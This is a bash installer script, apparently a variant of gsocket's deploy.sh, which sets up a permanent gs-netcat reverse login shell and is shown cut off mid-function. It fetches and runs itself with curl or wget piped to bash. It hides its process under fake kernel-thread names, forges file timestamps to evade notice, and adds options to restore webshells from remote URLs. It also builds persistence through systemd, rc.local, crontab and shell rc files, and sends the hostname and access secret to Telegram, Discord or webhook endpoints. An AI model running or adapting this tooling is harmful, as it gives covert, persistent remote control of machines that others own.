#! /usr/bin/env bash

# Install and start a permanent gs-netcat reverse login shell
#
# See https://www.gsocket.io/deploy/ for examples.
#
# This script is typically invoked like this as root or non-root user:
#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
#
# Connect
#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)""
# Pre-set a secret:
#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
# Uninstall
#   $ GS_UNDO=1 bash -c" $(curl -fsSL https://gsocket.io/x)"
#
# Other variables:
# GS_DEBUG=1
#		- Verbose output
#		- Shorter timeout to restart crontab etc
#       - Often used like this:
#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-netcat GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
# GS_USELOCAL=1
#       - Use local binaries (do not download)
# GS_USELOCAL_GSNC=<path to gs-netcat binary>
#       - Use local gs-netcat from source tree
# GS_NOSTART=1
#       - Do not start gs-netcat (for testing purpose only)
# GS_NOINST=1
#		- Do not install gsocket
# GS_OSARCH=x86_64-alpine
#       - Force architecutre to a specific package (for testing purpose only)
# GS_PREFIX=
#		- Use 'path' instead of '/' (needed for packaging/testing)
# GS_URL_BASE=https://gsocket.io
#		- Specify URL of static binaries
# GS_URL_BIN=
#		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
# GS_DSTDIR="/tmp/foobar/blah"
#		- Specify custom installation directory
# GS_HIDDEN_NAME="-bash"
#       - Specify custom hidden name for process, default is [kcached]
# GS_BIN_HIDDEN_NAME="gs-dbus"
#       - Specify custom name for binary on filesystem (default is gs-dbus)
#       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified.
# GS_DL=wget
#       - Command to use for download. =wget or =curl.
# GS_TG_TOKEN=
#       - Telegram Bot ID, =5794110125:AAFDNb...
# GS_TG_CHATID=
#       - Telegram Chat ID, =-8834838...
# GS_DISCORD_KEY=
#       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
# GS_WEBHOOK_KEY=
#       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
# GS_WEBHOOK=
#       - Generic webhook, ="https://foo.blah/log.php?s=\${GS_SECRET}"
# GS_HOST=
#       - IP or HOSTNAME of the GSRN-Server. Default is to use THC's infrastructure.
#       - See https://github.com/hackerschoice/gsocket-relay
# GS_PORT=
#       - Port for the GSRN-Server. Default is 443.
# TMPDIR=
#       - Guess what...
# GS_WEBSHELL_URL=
#       - URL source for webshell restoration (e.g., https://pastebin.cz/raw/xxx)
#       - Used when all files share the same source
# GS_WEBSHELL_FILES=
#       - Comma-separated list of webshell paths to monitor
#       - Used with GS_WEBSHELL_URL for single source
# GS_WEBSHELL_MAP=
#       - Multiple sources format: "file1:url1,file2:url2,file3:url3"
#       - Each file can have its own source URL
#       - Example: "/var/www/html/a.php:https://site1.com/src1,/var/www/html/b.php:https://site2.com/src2"
# GS_KEEPALIVE=1
#       - Enable keepalive script for webshell monitoring and self-healing

# Global Defines
URL_BASE_CDN="https://cdn.gsocket.io"
URL_BASE_X="https://gsocket.io"
[[ -n $GS_URL_BASE ]] && {
	URL_BASE_CDN="${GS_URL_BASE}"
	URL_BASE_X="${GS_URL_BASE}"
}
URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
[[ -n $GS_URL_BIN ]] && {
	URL_BIN="${GS_URL_BIN}"
	URL_BIN_FULL="$URL_BIN"
}
[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/y"

# STUBS for deploy_server.sh to fill out:
gs_deploy_webhook=
GS_WEBHOOK_404_OK=
[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
unset gs_deploy_webhook

# WEBHOOKS are executed after a successfull install
# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
### Telegram
# GS_TG_TOKEN="5794110125:AAFDNb..."
# GS_TG_CHATID="-8834838..."
[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
}
### Generic URL as webhook (any URL)
[[ -n $GS_WEBHOOK ]] && {
	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
}
### webhook.site
# GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
[[ -n $GS_WEBHOOK_KEY ]] && {
	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
}
### discord webhook
# GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
[[ -n $GS_DISCORD_KEY ]] && {
	data='{"username": "gsocket", "content": "'"${msg}"'"}'
	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
}
unset data
unset msg

DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
BIN_HIDDEN_NAME_DEFAULT="defunct"
# Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
# Pick a process name at random
PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
for str in "${proc_name_arr[@]}"; do
	PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
done
PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"

# PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
# ~/.config/<NAME>
CONFIG_DIR_NAME="htop"

# Names for 'uninstall' (including names from previous versions)
BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")

[[ -t 1 ]] && {
	CY="\033[1;33m" # yellow
	CDY="\033[0;33m" # yellow
	CG="\033[1;32m" # green
	CR="\033[1;31m" # red
	CDR="\033[0;31m" # red
	CB="\033[1;34m" # blue
	CC="\033[1;36m" # cyan
	CDC="\033[0;36m" # cyan
	CM="\033[1;35m" # magenta
	CN="\033[0m"    # none
	CW="\033[1;37m"
}

if [[ -z "$GS_DEBUG" ]]; then
	DEBUGF(){ :;}
else
	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
fi

_ts_fix()
{
	local fn
	local ts
	local args
	local ax
	fn="$1"
	ts="$2"

	args=() #OSX, must init or " " in touch " " -r 

	[[ ! -e "$1" ]] && return
	[[ -z $ts ]] && return

	# Change the symlink for ts_systemd_fn items
	[[ -n "$3" ]] && args=("-h")

	# Either reference by Timestamp or File
	[[ "${ts:0:1}" = '/' ]] && {
		[[ ! -e "${ts}" ]] && ts="/etc/ld.so.conf"
		ax=("${args[@]}" "-r" "$ts" "$fn")
		touch "${ax[@]}" 2>/dev/null
		return
	}
	ax=("${args[@]}" "-t" "$ts" "$fn")
	touch "${ax[@]}" 2>/dev/null && return
	# If 'date -r' or 'touch -t' failed:
	ax=("${args[@]}" "-r" "/etc/ld.so.conf" "$fn")
	touch "${ax[@]}" 2>/dev/null
}

# Restore timestamp of files
ts_restore()
{
	local fn
	local n
	local ts

	[[ ${#_ts_fn_a[@]} -ne ${#_ts_ts_a[@]} ]] && { echo >&2 "Ooops"; return; }

	n=0
	while :; do
		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
		ts="${_ts_ts_a[$n]}"
		fn="${_ts_fn_a[$n]}"
		# DEBUGF "RESTORE-TS ${fn} ${ts}"
		((n++))

		_ts_fix "$fn" "$ts"
	done
	unset _ts_fn_a
	unset _ts_ts_a

	n=0
	while :; do
		[[ $n -eq "${#_ts_systemd_ts_a[@]}" ]] && break
		ts="${_ts_systemd_ts_a[$n]}"
		fn="${_ts_systemd_fn_a[$n]}"
		# DEBUGF "RESTORE-LAST-TS ${fn} ${ts}"
		((n++))

		_ts_fix "$fn" "$ts" "symlink"
	done
	unset _ts_systemd_fn_a
	unset _ts_systemd_ts_a
}

ts_is_marked()
{
	local fn
	local a
	fn="$1"

	for a in "${_ts_fn_a[@]}"; do
		[[ "$a" = "$fn" ]] && return 0 # True
	done

	return 1 # False
}

# There are some files which need TimeStamp update after all other TimeStamps
# have been fixed. Noteable /etc/systemd/system/multi-user.target.wants
# ts_add_last [file] <reference file>
ts_add_systemd()
{
	local fn
	local ts
	local ref
	fn="$1"
	ref="$2"

	ts="$ref"
	[[ -z $ref ]] && {
		ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" || return
	}

	# Note: _ts_systemd_ts_a may store a number or a directory (start with '/')
	_ts_systemd_ts_a+=("$ts")
	_ts_systemd_fn_a+=("$fn")
}

# Determine the Timestamp of the file $fn that is about to be
# created (or already exists).
# Sets $_ts_ts to Timestamp.
# Usage: _ts_get_ts [$fn]
_ts_get_ts()
{
	local fn
	local n
	local pdir
	fn="$1"
	pdir="$(dirname "$1")"

	unset _ts_ts
	unset _ts_pdir_by_us
	# Inherit Timestamp if parent directory was created
	# by us.
	n=0
	while :; do
		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
		[[ "$pdir" = "${_ts_mkdir_fn_a[$n]}" ]] && {
			_ts_ts="${_ts_ts_a[$n]}"
			_ts_pdir_by_us=1
			# DEBUGF "Parent ${pdir} created by us."
			return
		}
		((n++))
	done

	# Check if file exists.
	[[ -e "$fn" ]] && _ts_ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" && return

	# Take ts from oldest file in directory
	# shellcheck disable=SC2012 #Use find instead of ls => not portable
	oldest="${pdir}/$(ls -atr "${pdir}" 2>/dev/null | head -n1)"
	_ts_ts="$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null)"
}


_ts_add()
{
	# Retrieve TimeStamp for $1
	_ts_get_ts "$1"
	# Add TimeStamp
	_ts_ts_a+=("$_ts_ts")
	_ts_fn_a+=("$1");
	_ts_mkdir_fn_a+=("$2")
}

# Note: Do not use global _ts variables except _ts_add_direct
# Usage: mk_file [filename]
mk_file()
{
	local fn
	local oldest
	local pdir
	local pdir_added
	fn="$1"
	local exists

	# DEBUGF "${CC}MK_FILE($fn)${CN}"
	pdir="$(dirname "$fn")"
	[[ -e "$fn" ]] && exists=1

	ts_is_marked "$pdir" || {
		# HERE: Parent not tracked
		_ts_add "$pdir" "<NOT BY XMKDIR>"
		pdir_added=1
	}

	ts_is_marked "$fn" || {
		# HERE: Not yet tracked
		_ts_get_ts "$fn"
		# Do not add creation fails.
		touch "$fn" 2>/dev/null || {
			# HERE: Permission denied
			[[ -n "$pdir_added" ]] && {
				# Remove pdir if it was added above
				# Bash <5.0 does not support arr[-1]
				# Quote (") to silence shellcheck
				unset "_ts_ts_a[${#_ts_ts_a[@]}-1]"
				unset "_ts_fn_a[${#_ts_fn_a[@]}-1]"
				unset "_ts_mkdir_fn_a[${#_ts_mkdir_fn_a[@]}-1]"
			}
			return 69 # False
		}
		[[ -z $exists ]] && chmod 600 "$fn"
		_ts_ts_a+=("$_ts_ts")
		_ts_fn_a+=("$fn");
		_ts_mkdir_fn_a+=("<NOT BY XMKDIR>")
		return
	}

	touch "$fn" 2>/dev/null || return
	[[ -z $exists ]] && chmod 600 "$fn"
	true
}

xrmdir()
{
	local fn
	local pdir
	fn="$1"

	[[ ! -d "$fn" ]] && return
	pdir="$(dirname "$fn")"

	ts_is_marked "$pdir" || {
		_ts_add "$pdir" "<RMDIR-UNTRACKED>"
	}

	rmdir "$fn" 2>/dev/null
}

xrm()
{
	local pdir
	local fn
	fn="$1"

	[[ ! -f "$fn" ]] && return
	pdir="$(dirname "$fn")"

	ts_is_marked "$pdir" || {
		# HERE: Parent is not tracked.
		_ts_add "$pdir" "<RM-UNTRACKED>"
	}

	rm -f "$1" 2>/dev/null
}

# Create a directory if it does not exist and fix timestamp
# xmkdir [directory] <ts reference file>
xmkdir()
{
	local fn
	local pdir
	fn="$1"

	DEBUGF "${CG}XMKDIR($fn)${CN}"
	pdir="$(dirname "$fn")"
	true # reset $?
	[[ -d "$fn" ]] && return     # Directory already exists
	[[ ! -d "$pdir" ]] && return # Parent dir does not exists (Huh?)

	# Check if parent is being tracked
	ts_is_marked "$pdir" || {
		# HERE: Parent not tracked
		# We did not create the parent or we would be tracking it.
		_ts_add "$pdir" "<NOT BY XMKDIR>"
	}

	# Check if new directory is already tracked
	ts_is_marked "$fn" || {
		# HERE: Not yet tracked (normal case)
		_ts_add "$fn" "$fn" # We create the directory (below)
	}

	mkdir "$fn" 2>/dev/null || return
	chmod 700 "$fn"
	true
}

xcp()
{
	local src
	local dst
	src="$1"
	dst="$2"

	# DEBUGF "${CG}XCP($src, $dst)${CN}"
	mk_file "$dst" || return
	cp "$src" "$dst" || return
	true
}

xmv()
{
	local src
	local dst
	src="$1"
	dst="$2"

	[[ -e "$dst" ]] && xrm "$dst"
	xcp "$src" "$dst" || return
	xrm "$src"
	true
}

clean_all()
{
	[[ "${#TMPDIR}" -gt 5 ]] && {
		rm -rf "${TMPDIR:?}/"*
		rmdir "${TMPDIR}"
	} &>/dev/null

	ts_restore
}

exit_code()
{
	clean_all

	exit "$1"
}

errexit()
{
	[[ -z "$1" ]] || echo -e >&2 "${CR}$*${CN}"

	exit_code 255
}

# Test if directory can be used to store executeable
# try_dstdir "/tmp/.gs-foobar"
# Return 0 on success.
try_dstdir()
{
	local dstdir
	local trybin
	dstdir="${1}"

	# Create directory if it does not exists.
	[[ ! -d "${dstdir}" ]] && { xmkdir "${dstdir}" || return 101; }

	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"
 
	mk_file "$DSTBIN" || return 102

	# Find an executeable and test if we can execute binaries from
	# destination directory (no noexec flag)
	# /bin/true might be a symlink to /usr/bin/true
	for ebin in "/bin/true" "$(command -v id)"; do
		[[ -z $ebin ]] && continue
		[[ -e "$ebin" ]] && break
	done
	[[ ! -e "$ebin" ]] && return 0 # True. Try our best

	# Must use same name on busybox-systems
	trybin="${dstdir}/$(basename "$ebin")"

	# /bin/true might be a symlink to /usr/bin/true
	[[ "$ebin" -ef "$trybin" ]] && return 0
	mk_file "$trybin" || return

	# Return if both are the same /bin/true and /usr/bin/true
	cp "$ebin" "$trybin" &>/dev/null || { rm -f "${trybin:?}"; return; }
	chmod 700 "$trybin"

	# Between 28th April and end of May 2020 we accidentially
	# over wrote /bin/true with gs-bd binary. Thus we use -g
	# to make true, id and gs-bd return true (in case it's gs-bs).
	"${trybin}" -g &>/dev/null || { rm -f "${trybin:?}"; return 104; } # FAILURE
	rm -f "${trybin:?}"

	return 0
}



# Called _after_ init_vars() at the end of init_setup.
init_dstbin()
{
	if [[ -n "$GS_DSTDIR" ]]; then
		try_dstdir "${GS_DSTDIR}" && return

		errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writeable and executeable."
	fi

	# Try systemwide installation first
	try_dstdir "${GS_PREFIX}/usr/bin" && return

	# Try user installation
	[[ ! -d "${GS_PREFIX}${HOME}/.config" ]] && xmkdir "${GS_PREFIX}${HOME}/.config"
	try_dstdir "${GS_PREFIX}${HOME}/.config/${CONFIG_DIR_NAME}" && return

	# Try current working directory
	try_dstdir "${PWD}" && { IS_DSTBIN_CWD=1; return; }

	# Try /tmp/.gsusr-*
	try_dstdir "/tmp/.gsusr-${UID}" && { IS_DSTBIN_TMP=1; return; }

	# Try /dev/shm as last resort
	try_dstdir "/dev/shm" && { IS_DSTBIN_TMP=1; return; }

	echo -e >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
	errexit
}

try_tmpdir()
{
	[[ -n $TMPDIR ]] && return # already set

	[[ ! -d "$1" ]] && return

	[[ -d "$1" ]] && xmkdir "${1}/${2}" && TMPDIR="${1}/${2}"
}

try_encode()
{
	local enc
	local dec
	local teststr
	prg="$1"
	enc="$2"
	dec="$3"

	teststr="blha|;id-u \'this is a long test of a very long string to test encodign decoding process # foobar"

	[[ -n $ENCODE_STR ]] && return

	command -v "$prg" >/dev/null && [[ "$(echo "$teststr" | $enc 2>/dev/null| $dec 2>/dev/null)" = "$teststr" ]] || return
	ENCODE_STR="$enc"
	DECODE_STR="$dec"
}


# Return TRUE if we are 100% sure it's little endian
is_le()
{
	command -v lscpu >/dev/null && {
		[[ $(lscpu) == *"Little Endian"* ]] && return 0
		return 255
	}

	command -v od >/dev/null && command -v awk >/dev/null && {
		[[ $(echo -n I | od -o | awk 'FNR==1{ print substr($2,6,1)}') == "1" ]] && return 0
	}

	return 255
}

init_vars()
{
	# Select binary
	local arch
	local osname
	arch=$(uname -m)

	if [[ -z "$HOME" ]]; then
		HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
		[[ ! -d "$HOME" ]] && errexit "ERROR: \$HOME not set. Try 'export HOME=<users home directory>'"
		WARN "HOME not set. Using 'HOME=$HOME'"
	fi

	# set PWD if not set
	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"

	[[ -z "$OSTYPE" ]] && {
		local osname
		osname="$(uname -s)"
		if [[ "$osname" == *FreeBSD* ]]; then
			OSTYPE="FreeBSD"
		elif [[ "$osname" == *Darwin* ]]; then
			OSTYPE="darwin22.0"
		elif [[ "$osname" == *OpenBSD* ]]; then
			OSTYPE="openbsd7.3"
		elif [[ "$osname" == *Linux* ]]; then
			OSTYPE="linux-gnu"
		fi
	}

	unset OSARCH
	unset SRC_PKG
	# User supplied OSARCH
	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"

	if [[ -z "$OSARCH" ]]; then
		if [[ $OSTYPE == *linux* ]]; then 
			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
				OSARCH="i386-alpine"
				SRC_PKG="gs-netcat_mini-linux-i686"
			elif [[ "$arch" == *"armv6"* ]]; then
				OSARCH="arm-linux"
				SRC_PKG="gs-netcat_mini-linux-armv6"
			elif [[ "$arch" == *"armv7l" ]]; then
				OSARCH="arm-linux"
				SRC_PKG="gs-netcat_mini-linux-armv7l"
			elif [[ "$arch" == *"armv"* ]]; then
				OSARCH="arm-linux" # RPI-Zero / RPI 4b+
				SRC_PKG="gs-netcat_mini-linux-arm"
			elif [[ "$arch" == "aarch64" ]]; then
				OSARCH="aarch64-linux"
				SRC_PKG="gs-netcat_mini-linux-aarch64"
			elif [[ "$arch" == "mips64" ]]; then
				OSARCH="mips64-alpine"
				SRC_PKG="gs-netcat_mini-linux-mips64"
				# Go 32-bit if Little Endian even if 64bit arch
				is_le && {
					OSARCH="mipsel32-alpine"
					SRC_PKG="gs-netcat_mini-linux-mipsel"
				}
			elif [[ "$arch" == *mips* ]]; then
				OSARCH="mips32-alpine"
				SRC_PKG="gs-netcat_mini-linux-mips32"
				is_le && {
					OSARCH="mipsel32-alpine"
					SRC_PKG="gs-netcat_mini-linux-mipsel"
				}
			fi
		elif [[ $OSTYPE == *darwin* ]]; then
			if [[ "$arch" == "arm64" ]]; then
				OSARCH="x86_64-osx" # M1
				## FIXME: really needs M3 here..
				SRC_PKG="gs-netcat_mini-macOS-x86_64"
				# OSARCH="arm64-osx" # M1
			else
				OSARCH="x86_64-osx"
				SRC_PKG="gs-netcat_mini-macOS-x86_64"
			fi
		elif [[ ${OSTYPE,,} == *freebsd* ]]; then
				OSARCH="x86_64-freebsd"
				SRC_PKG="gs-netcat_mini-freebsd-x86_64"
		elif [[ ${OSTYPE,,} == *openbsd* ]]; then
				OSARCH="x86_64-openbsd"
				SRC_PKG="gs-netcat_mini-openbsd-x86_64"
		elif [[ ${OSTYPE,,} == *cygwin* ]]; then
			OSARCH="i686-cygwin"
			[[ "$arch" == "x86_64" ]] && OSARCH="x86_64-cygwin"
		# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
				# OSARCH="i386-hurd" # debian-hurd
		fi

		[[ -z "$OSARCH" ]] && {
			# Default: Try Alpine(muscl libc) 64bit
			OSARCH="x86_64-alpine"
			SRC_PKG="gs-netcat_mini-linux-x86_64"
		}
	fi

	# Docker does not set USER
	[[ -z "$USER" ]] && USER=$(id -un)
	[[ -z "$UID" ]] && UID=$(id -u)

	# check that xxd is working as expected (alpine linux does not have -r option)
	try_encode "base64" "base64 -w0" "base64 -d"
	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"

	# OSX's pkill matches the hidden name and not the original binary name.
	# Because we hide as '-bash' we can not use pkill all -bash.
	# 'killall' however matches gs-dbus and on OSX we thus force killall
	if [[ $OSTYPE == *darwin* ]]; then
		# on OSX 'pkill' matches the process (argv[0]) whereas on Unix
		# 'pkill' matches the binary name.
		KL_CMD="killall"
		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
	elif command -v pkill >/dev/null; then
		KL_CMD="pkill"
		KL_CMD_RUNCHK_UARG=("-0" "-U${UID}")
	elif command -v killall >/dev/null; then
		KL_CMD="killall"
		# cygwin's killall needs the name (not the uid)
		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
	fi

	# $PATH might be set differently in crontab/.profile. Use
	# absolute path to binary instead:
	KL_CMD_BIN="$(command -v "$KL_CMD")"
	[[ -z $KL_CMD_BIN ]] && {
		# set to something that returns 'false' so that we dont
		# have to check for empty string in crontab/.profile
		# (e.g. skip checking if already running and always start)
		KL_CMD_BIN="$(command -v false)"
		[[ -z $KL_CMD_BIN ]] && KL_CMD_BIN="/bin/does-not-exit"
		WARN "No pkill or killall found."
	}

	# Defaults
	# Binary file is called gs-dbus or set to same name as Process name if
	# GS_HIDDEN_NAME is set. Can be overwritten with GS_BIN_HIDDEN_NAME=
	if [[ -n $GS_BIN_HIDDEN_NAME ]]; then
		BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME}"
		BIN_HIDDEN_NAME_RM+=("$GS_BIN_HIDDEN_NAME")
	else
		BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
	fi
	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
	
	SEC_NAME="${BIN_HIDDEN_NAME}.dat"
	if [[ -n $GS_HIDDEN_NAME ]]; then
		PROC_HIDDEN_NAME="${GS_HIDDEN_NAME}"
		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
	else
		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
	fi

	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"

	RCLOCAL_DIR="${GS_PREFIX}/etc"
	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"

	# Create a list of potential rc-files.
	# - .bashrc is often, but not always, included by .bash_profile [IGNORE]
	# - .bash_login is ignored if .bash_profile exists
	# - $SHELL might not be set (if /bin/sh was gained by RCE)
	[[ -f ~/.zshrc ]] && RC_FN_LIST+=(".zshrc")
	if [[ -f ~/.bashrc ]]; then
		RC_FN_LIST+=(".bashrc")
		# Assume .bashrc is loaded by .bash_profile and .profile
	else
		# HERE: not bash or .bashrc does not exist
		if [[ -f ~/.bash_profile ]]; then
			RC_FN_LIST+=(".bash_profile")
		elif [[ -f ~/.bash_login ]]; then
			RC_FN_LIST+=(".bash_login")
		fi
	fi
	[[ -f ~/.profile ]] && RC_FN_LIST+=(".profile")
	[[ ${#RC_FN_LIST[@]} -eq 0 ]] && RC_FN_LIST+=(".profile")

	[[ -d "${GS_PREFIX}/etc/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
	[[ -d "${GS_PREFIX}/lib/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/lib/systemd/system"
	WANTS_DIR="${GS_PREFIX}/etc/systemd/system" # always this
	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"

	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
	[[ ! -d "${CRONTAB_DIR}" ]] && CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"

	local pids
	# Linux 'pgrep kswapd0' would match _binary_ kswapd0 even if argv[0] is '[rcu_preempt]'
	# and also matches kernel process '[kwapd0]'.
	pids="$(pgrep "${BIN_HIDDEN_NAME_RX}" 2>/dev/null)"
	# OSX's pgrep works on argv[0] proc-name:
	[[ -z $pids ]] && pids="$(pgrep "(${PROC_HIDDEN_NAME_RX})" 2>/dev/null)"

	[[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }" # Convert multi line into single line
	unset pids

	# DL_CMD is used for help output of how to uninstall
	if [[ -n "$GS_USELOCAL" ]]; then
		DL_CMD="./deploy-all.sh"
	elif command -v curl >/dev/null; then
		DL_CMD="$DL_CRL"
	elif command -v wget >/dev/null; then
		DL_CMD="$DL_WGT"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
		errexit
	fi

	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
		IS_USE_CURL=1
		### Note: need -S (--show-errors) to process 404 for CF webhooks.
		DL=("curl" "-fsSL" "--connect-timeout" "7" "-m900" "--retry" "3")
		[[ -n $GS_DEBUG ]] && DL+=("-v")
		[[ -n $GS_NOCERTCHECK ]] && DL+=("-k")
	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
		IS_USE_WGET=1
		### Note: Dont use -q: Need errors to process 404 for CF webhooks
		# Read-timeout is 900 seconds by default.
		DL=("wget" "-O-" "--connect-timeout=7" "--dns-timeout=7")
		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")

	else
		DL=("false")   # Should not happen
	fi

	[[ $SHELL == *"nologin"* ]] && unset SHELL
	[[ $SHELL == *"jail"* ]] && unset SHELL  # /usr/local/cpanel/bin/jailshell
	[[ $SHELL == *"noshell"* ]] && unset SHELL  #  /usr/local/cpanel/bin/noshell
	[[ $SHELL == *"/dev/null"* ]] && unset SHELL
	# Test that shell is a good shell.
	[[ -n $SHELL ]] && [[ "$("$SHELL" -c "echo TRUE" 2>/dev/null)" != "TRUE" ]] && unset SHELL

	DEBUGF "OLD_PIDS='$OLD_PIDS'"
	DEBUGF "SRC_PKG=$SRC_PKG"
}

mk_encode()
{
	echo "{ echo $(echo "$1"|${ENCODE_STR})|${DECODE_STR}|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
}

init_setup()
{
	[[ -n $TMPDIR ]] && try_tmpdir "${TMPDIR}" ".gs-${UID}"
	try_tmpdir "/dev/shm" ".gs-${UID}"
	try_tmpdir "/tmp" ".gs-${UID}"
	try_tmpdir "${HOME}" ".gs"
	try_tmpdir "$(pwd)" ".gs-${UID}"

	if [[ -n "$GS_PREFIX" ]]; then
		# Debuggin and testing into separate directory
		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
		if [[ -f "${HOME}/${RC_FN_LIST[1]}" ]]; then
			xcp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
		fi
		xcp -p /etc/rc.local "${GS_PREFIX}/etc/"
	fi

	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"

